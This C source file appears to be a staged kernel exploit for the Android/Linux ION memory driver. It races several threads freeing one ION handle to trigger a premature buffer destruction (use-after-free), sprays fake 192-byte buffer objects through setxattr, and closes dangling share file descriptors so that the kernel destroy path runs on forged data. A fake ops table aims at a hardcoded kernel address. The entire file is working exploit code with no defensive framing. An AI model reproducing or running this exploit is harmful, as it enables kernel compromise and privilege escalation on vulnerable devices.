#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

/* v4: in-band detector for the premature handle destruction, then trigger.
 *
 * Per round, one client:
 *   ALLOC H1 (+SHARE, keep fd)
 *   N threads FREE(H1)          -> extra kref_put(s) happen after H1 is destroyed
 *   ALLOC H2 (+SHARE, keep fd)  -> H2 very likely REUSES H1's kmalloc-64 slot,
 *                                   so a late extra put decrements H2's ref and
 *                                   destroys H2 while it is still in the idr.
 *   FREE(H2)                     -> EINVAL  == detector: H2 was already gone
 *                                   => a buffer is now dangling; its SHARE fd
 *                                   is still open, so a 192B spray + close()
 *                                   fires _ion_buffer_destroy on our bytes.
 * Zero kernel writes in detect mode; the only kernel write later would be
 * heap+0xec (an atomic_sub) which in this stage still points at our page.
 */
#define IB_REF 0x00
#define IB_NODE 0x08
#define IB_DEV 0x20
#define IB_HEAP 0x28
#define IB_SIZE 0x40
#define IB_KMAP 0x78
#define IB_VMAS 0x98
#define IB_HCNT 0xa8
#define IH_OPS 0x38
#define IH_FLAGS 0x40
#define IH_ATOMIC 0xe8
#define OBJ_SZ 192
#define PRINTK 0xffffffc000d8fad8UL

#define ION_ALLOC 0xc0204900u
#define ION_FREE 0xc0044901u
#define ION_SHARE 0xc0084904u

struct ad { unsigned long long len, align; unsigned mask, flags, handle, pad; };
struct fdd { unsigned handle; int fd; };

static int g_nracer = 3, g_heapbit = 9, g_stop, g_go, g_ready, g_done;
static volatile unsigned g_id;
static int g_cfd;
static unsigned char g_tmpl[OBJ_SZ];
static unsigned *g_heap_pg, *g_dev_pg, *g_ops_pg;
static char g_path[128] = "/data/local/tmp/v4_file";
static int g_dang[8], g_ndang;

static void *racer(void *a)
{
    unsigned id = g_id;
    g_ready++;
    while (!g_go) sched_yield();
    ioctl(g_cfd, ION_FREE, &id);
    g_done++;
    return NULL;
}

static void *sprayer(void *a)
{
    int i;
    while (!g_stop) {
        for (i = 0; i < 20; i++) {
            if (g_stop) break;
            setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static void build(const char *marker)
{
    memset(g_tmpl, 0, sizeof g_tmpl);
    memset(g_heap_pg, 0, 4096);
    memset(g_dev_pg, 0, 4096);
    memset(g_ops_pg, 0, 4096);
    strcpy((char *)g_heap_pg, marker);
    *(unsigned long *)((char *)g_heap_pg + IH_OPS) = (unsigned long)g_ops_pg;
    *(unsigned long *)((char *)g_ops_pg + 0x08) = PRINTK;
    *(unsigned long *)((char *)g_ops_pg + 0x20) = PRINTK;
    *(unsigned long *)((char *)g_ops_pg + 0x30) = PRINTK;
    *(unsigned int *)(g_tmpl + IB_REF) = 1;
    *(unsigned long *)(g_tmpl + IB_NODE) = (unsigned long)g_dev_pg | 1;
    *(unsigned long *)(g_tmpl + IB_DEV) = (unsigned long)g_dev_pg;
    *(unsigned long *)(g_tmpl + IB_HEAP) = (unsigned long)g_heap_pg;
    *(unsigned long *)(g_tmpl + IB_SIZE) = 1;
    *(unsigned int *)(g_tmpl + IB_KMAP) = 0;
    *(unsigned long *)(g_tmpl + IB_VMAS) = (unsigned long)(g_tmpl + IB_VMAS);
    *(unsigned long *)(g_tmpl + IB_VMAS + 8) = (unsigned long)(g_tmpl + IB_VMAS);
    *(unsigned int *)(g_tmpl + IB_HCNT) = 1;
    g_dev_pg[2] = 0xdeadbeefu;      /* dev+0x08 */
    g_dev_pg[4] = 0xdeadbeefu;      /* dev+0x10 */
    g_heap_pg[IH_ATOMIC / 4] = 0x5000u;
}

static int oracles(void)
{
    if (g_dev_pg[2] != 0xdeadbeefu || g_dev_pg[4] != 0xdeadbeefu) {
        printf("  ORACLE dev changed: [+8]=%08x [+0x10]=%08x\n", g_dev_pg[2], g_dev_pg[4]);
        return 1;
    }
    if (g_heap_pg[IH_ATOMIC / 4] != 0x5000u) {
        printf("  ORACLE heap+0xe8 = %08x (atomic_sub ran!)\n", g_heap_pg[IH_ATOMIC / 4]);
        return 1;
    }
    return 0;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 40;
    int i, j, fd, hit = 0, detected = 0;
    pthread_t th[16];
    const char *marker = "XPLAY6_V4_REACHED\n";

    if (argc > 2) g_nracer = atoi(argv[2]);
    setvbuf(stdout, NULL, _IOLBF, 0);
    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("file"); return 1; }
    close(fd);
    g_heap_pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_dev_pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_ops_pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_cfd = open("/dev/ion", O_RDONLY);
    if (g_cfd < 0) { perror("/dev/ion"); return 1; }
    build(marker);
    printf("v4: racers=%d rounds=%d heapbit=%d\n", g_nracer, rounds, g_heapbit);

    for (i = 0; i < 6; i++)
        pthread_create(&th[i], NULL, sprayer, (void *)(long)i);

    for (i = 0; i < rounds && !hit; i++) {
        struct ad a, b;
        struct fdd sa, sb;
        unsigned hb;
        int r2;

        memset(&a, 0, sizeof a);
        a.len = 0x1000; a.align = 4096; a.mask = 1u << g_heapbit;
        if (ioctl(g_cfd, ION_ALLOC, &a)) { printf("alloc1 errno=%d\n", errno); break; }
        memset(&sa, 0, sizeof sa); sa.handle = a.handle;
        if (ioctl(g_cfd, ION_SHARE, &sa)) { printf("share1 errno=%d\n", errno); break; }
        if (g_ndang < 8) g_dang[g_ndang++] = sa.fd; else close(sa.fd);  /* keep: closing it early parks the buffer on the DEFER_FREE list and then the extra puts take a mutex of an object the delayed work is recycling -> self-deadlock */

        g_id = a.handle; g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[6 + j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer) sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer) sched_yield();
        for (j = 0; j < g_nracer; j++) pthread_join(th[6 + j], NULL);

        memset(&b, 0, sizeof b);
        b.len = 0x1000; b.align = 4096; b.mask = 1u << g_heapbit;
        if (ioctl(g_cfd, ION_ALLOC, &b)) { printf("alloc2 errno=%d\n", errno); break; }
        memset(&sb, 0, sizeof sb); sb.handle = b.handle;
        if (ioctl(g_cfd, ION_SHARE, &sb)) { printf("share2 errno=%d\n", errno); break; }

        hb = b.handle;
        errno = 0;
        r2 = ioctl(g_cfd, ION_FREE, &hb);
        if (r2 && errno == EINVAL) {
            detected++;
            printf("  round %d: DETECTED premature destroy (H2 id=%u free->EINVAL); fd=%d dangling\n",
                   i, b.handle, sb.fd);
            if (g_ndang < 8) g_dang[g_ndang++] = sb.fd; else close(sb.fd);
            /* fire: spray then close the dangling fds, check canaries */
            for (j = 0; j < g_ndang && !hit; j++) {
                int k;
                build(marker);
                for (k = 0; k < 40; k++) setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0);
                close(g_dang[j]);
                usleep(3000);
                if (oracles()) { printf("  *** REACHED via fd %d\n", g_dang[j]); hit = 1; }
                g_dang[j] = g_dang[--g_ndang];
            }
        } else {
            close(sb.fd);
            if (r2 == 0) { /* normal */ }
            else printf("  round %d: H2 free errno=%d\n", i, errno);
        }
    }
    g_stop = 1;
    for (i = 0; i < 6; i++) pthread_join(th[i], NULL);
    for (i = 0; i < g_ndang; i++) close(g_dang[i]);
    printf("RESULT detected=%d hit=%d\n", detected, hit);
    close(g_cfd);
    return hit ? 0 : 3;
}
